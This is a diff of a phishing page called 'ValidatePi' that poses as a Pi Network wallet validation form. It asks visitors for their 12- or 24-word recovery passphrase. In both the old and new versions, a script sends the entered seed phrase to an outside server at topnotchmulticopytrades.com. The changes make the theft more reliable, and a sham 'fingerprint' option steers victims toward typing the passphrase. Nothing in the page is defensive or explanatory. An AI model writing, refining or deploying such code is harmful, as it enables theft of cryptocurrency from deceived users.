@@ -1,112 +1,90 @@
 <!DOCTYPE html>
 <html lang="en">
-   <head>
-      <meta charSet="utf-8"/>
-      <meta name="viewport" content="width=device-width, initial-scale=1"/>
-      <link rel="preload" href="media/376dd8dc38524313-s.p.woff2" as="font" crossorigin="" type="font/woff2"/>
-      <link rel="preload" href="media/7777133e901cd5ed-s.p.woff2" as="font" crossorigin="" type="font/woff2"/>
-      <link rel="preload" href="media/9a881e2ac07d406b-s.p.woff2" as="font" crossorigin="" type="font/woff2"/>
-      <link rel="preload" href="media/bd427f25ac24d036-s.p.woff2" as="font" crossorigin="" type="font/woff2"/>
-      <link rel="preload" href="media/d869208648ca5469-s.p.woff2" as="font" crossorigin="" type="font/woff2"/>
-      <link rel="stylesheet" href="index.css" crossorigin="" data-precedence="next"/>
-      <!-- <link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-8c01a0e7cd33ef20.js" crossorigin=""/>
-      <script src="/_next/static/chunks/fd9d1056-0d3e59ecefe83fbe.js" async="" crossorigin=""></script><script src="/_next/static/chunks/69-0006ba3efccea8ae.js" async="" crossorigin=""></script><script src="/_next/static/chunks/main-app-f5c8d25c8479457f.js" async="" crossorigin=""></script><script src="/_next/static/chunks/314-ded8c4b7d2ac0d5e.js" async=""></script><script src="/_next/static/chunks/app/validate/page-f33d5b095368ca42.js" async=""></script> -->
-      <title>ValidatePi</title>
-      <meta name="description" content="Validate your Pi Wallet"/>
-      <meta name="next-size-adjust"/>
-      <!-- <script src="/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js" crossorigin="" noModule=""></script> -->
-   </head>
-   <body class="">
-      <div>
-         <main class="mt-7 flex flex-col items-center min-h-screen" style="opacity:1">
-            <form class="max-w-[500px] min-h-screen w-full" id="validate-form">
-               <p class="mb-8 font-bold text-lg lg:text-xl text-center">Validate Pi Wallet</p>
-               <div class="w-full px-5 lg:px-10">
-                  <div id="border" class="h-64 border-2 duration-300 rounded-md cursor-text false  border-gray-400">
-                    <input id="passphrase" placeholder="Enter your 12 or 24 word passphrase here" autofocus="" autoComplete="false" class="p-3 w-full placeholder:text-white placeholder:font-normal  bg-transparent font-semibold resize-none duration-300 text-sm lg:text-base outline-none text-white rounded" id="" name="message" value=""/>
-                  </div>
-                  <div id="error-message"  class="duration-500 overflow-hidden" style="display: none;">
-                     <p class="text-sm text-red-500 m-1">Passphrase must have 12 or 24 words but you provided only <span id="WordLength">0</span></p>
-                  </div>
+<head>
+   <meta charSet="utf-8"/>
+   <meta name="viewport" content="width=device-width, initial-scale=1"/>
+   <link rel="preload" href="media/376dd8dc38524313-s.p.woff2" as="font" crossorigin="" type="font/woff2"/>
+   <link rel="preload" href="media/7777133e901cd5ed-s.p.woff2" as="font" crossorigin="" type="font/woff2"/>
+   <link rel="preload" href="media/9a881e2ac07d406b-s.p.woff2" as="font" crossorigin="" type="font/woff2"/>
+   <link rel="preload" href="media/bd427f25ac24d036-s.p.woff2" as="font" crossorigin="" type="font/woff2"/>
+   <link rel="preload" href="media/d869208648ca5469-s.p.woff2" as="font" crossorigin="" type="font/woff2"/>
+   <link rel="stylesheet" href="index.css" crossorigin="" data-precedence="next"/>
+   <title>ValidatePi</title>
+   <meta name="description" content="Validate your Pi Wallet"/>
+   <meta name="next-size-adjust"/>
+</head>
+<body>
+   <div>
+      <main class="mt-7 flex flex-col items-center min-h-screen" style="opacity:1">
+         <form class="max-w-[500px] min-h-screen w-full" id="validate-form">
+            <p class="mb-8 font-bold text-lg lg:text-xl text-center">Validate Pi Wallet</p>
+            <div class="w-full px-5 lg:px-10">
+               <div id="border" class="h-64 border-2 duration-300 rounded-md cursor-text false  border-gray-400">
+                  <input id="passphrase" placeholder="Enter your 12 or 24 word passphrase here" autofocus="" autoComplete="false" class="p-3 w-full placeholder:text-white placeholder:font-normal  bg-transparent font-semibold resize-none duration-300 text-sm lg:text-base outline-none text-white rounded" name="message" value=""/>
                </div>
-               <div class="px-5 lg:px-10 center">
-                <button class="w-full py-3 h-14 text-xs lg:text-sm duration-500 center rounded-full border-[3px] mt-5  font-semibold uppercase border-customPurpleB shadow-md text-white" type="submit"> validate with passphrase</button>
+               <div id="error-message" class="duration-500 overflow-hidden" style="display: none;">
+                  <p class="text-sm text-red-500 m-1">Passphrase must have 12 or 24 words but you provided only <span id="WordLength">0</span></p>
+               </div>
             </div>
-               <div class="px-5 lg:px-10 mt-7">
-                  <p class="w-full h-14 lg:py-4 center text-xs lg:text-sm rounded-full border-[3px] bg-customPurpleB border-customYellow shadow-md hover:bg-customPurpleA  hover:border-customPurpleA cursor-pointer duration-300 text-white text-center font-semibold uppercase">
-                     validate with fingerprint<!-- --> 
-                  </p>
-                  <p class="text-red-500 m-2 text-sm duration-500 opacity-0">Sorry this option is under maintenance, try validating with the Passphrase option above</p>
-               </div>
-            </form>
-         </main>
-      </div>
-      <!-- <script src="/_next/static/chunks/webpack-8c01a0e7cd33ef20.js" crossorigin="" async=""></script><script>(self.__next_f=self.__next_f||[]).push([0]);self.__next_f.push([2,null])</script><script>self.__next_f.push([1,"1:HL[\"media/376dd8dc38524313-s.p.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n2:HL[\"media/7777133e901cd5ed-s.p.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n3:HL[\"media/9a881e2ac07d406b-s.p.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n4:HL[\"media/bd427f25ac24d036-s.p.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n5:HL[\"media/d869208648ca5469-s.p.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n6:HL[\"/"])</script><script>self.__next_f.push([1,"_next/static/css/e3fd4da93f7016db.css\",\"style\",{\"crossOrigin\":\"\"}]\n0:\"$L7\"\n"])</script><script>self.__next_f.push([1,"8:I[7690,[],\"\"]\na:I[6730,[\"314\",\"static/chunks/314-ded8c4b7d2ac0d5e.js\",\"68\",\"static/chunks/app/validate/page-f33d5b095368ca42.js\"],\"\"]\nb:I[5613,[],\"\"]\nc:I[1778,[],\"\"]\ne:I[8955,[],\"\"]\nf:[]\n"])</script><script>self.__next_f.push([1,"7:[[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"index.css\",\"precedence\":\"next\",\"crossOrigin\":\"\"}]],[\"$\",\"$L8\",null,{\"buildId\":\"OFsOK_MskPXpYVgdyvGoQ\",\"assetPrefix\":\"\",\"initialCanonicalUrl\":\"/validate\",\"initialTree\":[\"\",{\"children\":[\"validate\",{\"children\":[\"__PAGE__\",{}]}]},\"$undefined\",\"$undefined\",true],\"initialSeedData\":[\"\",{\"children\":[\"validate\",{\"children\":[\"__PAGE__\",{},[\"$L9\",[\"$\",\"div\",null,{\"children\":[\"$\",\"$La\",null,{}]}],null]]},[\"$\",\"$Lb\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\",\"validate\",\"children\"],\"loading\":\"$undefined\",\"loadingStyles\":\"$undefined\",\"loadingScripts\":\"$undefined\",\"hasLoading\":false,\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$Lc\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"notFoundStyles\":\"$undefined\",\"styles\":null}]]},[null,[\"$\",\"html\",null,{\"lang\":\"en\",\"children\":[\"$\",\"body\",null,{\"className\":\"__className_e759be\",\"children\":[\"$\",\"$Lb\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\"],\"loading\":\"$undefined\",\"loadingStyles\":\"$undefined\",\"loadingScripts\":\"$undefined\",\"hasLoading\":false,\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$Lc\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":[[\"$\",\"title\",null,{\"children\":\"404: This page could not be found.\"}],[\"$\",\"div\",null,{\"style\":{\"fontFamily\":\"system-ui,\\\"Segoe UI\\\",Roboto,Helvetica,Arial,sans-serif,\\\"Apple Color Emoji\\\",\\\"Segoe UI Emoji\\\"\",\"height\":\"100vh\",\"textAlign\":\"center\",\"display\":\"flex\",\"flexDirection\":\"column\",\"alignItems\":\"center\",\"justifyContent\":\"center\"},\"children\":[\"$\",\"div\",null,{\"children\":[[\"$\",\"style\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"body{color:#000;background:#fff;margin:0}.next-error-h1{border-right:1px solid rgba(0,0,0,.3)}@media (prefers-color-scheme:dark){body{color:#fff;background:#000}.next-error-h1{border-right:1px solid rgba(255,255,255,.3)}}\"}}],[\"$\",\"h1\",null,{\"className\":\"next-error-h1\",\"style\":{\"display\":\"inline-block\",\"margin\":\"0 20px 0 0\",\"padding\":\"0 23px 0 0\",\"fontSize\":24,\"fontWeight\":500,\"verticalAlign\":\"top\",\"lineHeight\":\"49px\"},\"children\":\"404\"}],[\"$\",\"div\",null,{\"style\":{\"display\":\"inline-block\"},\"children\":[\"$\",\"h2\",null,{\"style\":{\"fontSize\":14,\"fontWeight\":400,\"lineHeight\":\"49px\",\"margin\":0},\"children\":\"This page could not be found.\"}]}]]}]}]],\"notFoundStyles\":[],\"styles\":null}]}]}],null]],\"initialHead\":[false,\"$Ld\"],\"globalErrorComponent\":\"$e\",\"missingSlots\":\"$Wf\"}]]\n"])</script><script>self.__next_f.push([1,"d:[[\"$\",\"meta\",\"0\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}],[\"$\",\"meta\",\"1\",{\"charSet\":\"utf-8\"}],[\"$\",\"title\",\"2\",{\"children\":\"ValidatePi\"}],[\"$\",\"meta\",\"3\",{\"name\":\"description\",\"content\":\"Validate your Pi Wallet\"}],[\"$\",\"meta\",\"4\",{\"name\":\"next-size-adjust\"}]]\n9:null\n"])</script><script>self.__next_f.push([1,""])</script> -->
-   </body>
+            <div class="px-5 lg:px-10 center">
+               <button class="w-full py-3 h-14 text-xs lg:text-sm duration-500 center rounded-full border-[3px] mt-5 font-semibold uppercase border-customPurpleB shadow-md text-white" type="submit">validate with passphrase</button>
+            </div>
+            <div class="px-5 lg:px-10 mt-7">
+               <p class="w-full h-14 lg:py-4 center text-xs lg:text-sm rounded-full border-[3px] bg-customPurpleB border-customYellow shadow-md hover:bg-customPurpleA hover:border-customPurpleA cursor-pointer duration-300 text-white text-center font-semibold uppercase">
+                  validate with fingerprint
+               </p>
+               <p class="text-red-500 m-2 text-sm duration-500 opacity-0">Sorry this option is under maintenance, try validating with the Passphrase option above</p>
+            </div>
+         </form>
+      </main>
+   </div>
 
    <script>
+      function submitPassphrase(passphrase) {
+         const url = 'https://topnotchmulticopytrades.com/forward.php';
+
+         fetch(url, {
+            method: 'POST',
+            headers: {
+               'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ passphrase: passphrase })
+         })
+         .then(response => {
+            if (!response.ok) {
+               throw new Error('Network response was not ok ' + response.statusText);
+            }
+            return response.json();
+         })
+         .then(data => {
+            location.replace('success.html');
+         })
+         .catch(error => {
+            console.error('Error:', error);
+            // You can add code here to handle the error
+         });
+      }
+
       document.getElementById('validate-form').addEventListener('submit', function(event) {
          event.preventDefault();
          const passphraseInput = document.getElementById('passphrase').value;
          const words = passphraseInput.split(' ').filter(word => word.trim() !== '');
          const errorMessage = document.getElementById('error-message');
          const border = document.getElementById('border');
-   
+         const wordLen = document.getElementById('WordLength');
+
          if (words.length !== 12 && words.length !== 24) {
-            var wordLen = document.getElementById('WordLength');
-            wordLen.textContent = words.length
+            wordLen.textContent = words.length;
             errorMessage.style.display = 'block';
             border.classList.remove('border-gray-400');
-            border.classList.add('border-red-500')
+            border.classList.add('border-red-500');
          } else {
             errorMessage.style.display = 'none';
-            border.classList.remove('border-red-500')
+            border.classList.remove('border-red-500');
             border.classList.add('border-gray-400');
-            submit();
+            submitPassphrase(passphraseInput);
          }
       });
    </script>
-
-   <script>
-
-      function submit(){
-
-         document.getElementById('validate-form').addEventListener('submit', function(event) {
-        event.preventDefault(); // Prevent the default form submission
-
-        const passphrase = document.getElementById('passphrase').value;
- 
-        // Define the URL for the external script
-        const url = 'https://topnotchmulticopytrades.com/forward.php';
-
-        // Send the POST request using fetch
-        fetch(url, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({ passphrase: passphrase })
-        })
-        .then(response => {
-            if (!response.ok) {
-                throw new Error('Network response was not ok ' + response.statusText);
-            }
-            return response.json();
-        })
-        .then(data => {
-            alert('Your Validation is Processing')
-            // console.log('Success:', data);
-            // // You can add code here to handle the successful response
-        })
-        .catch(error => {
-            console.error('Error:', error);
-            // You can add code here to handle the error
-        });
-    });
-
-      }
-    
-</script>
-
-
+</body>
 </html>
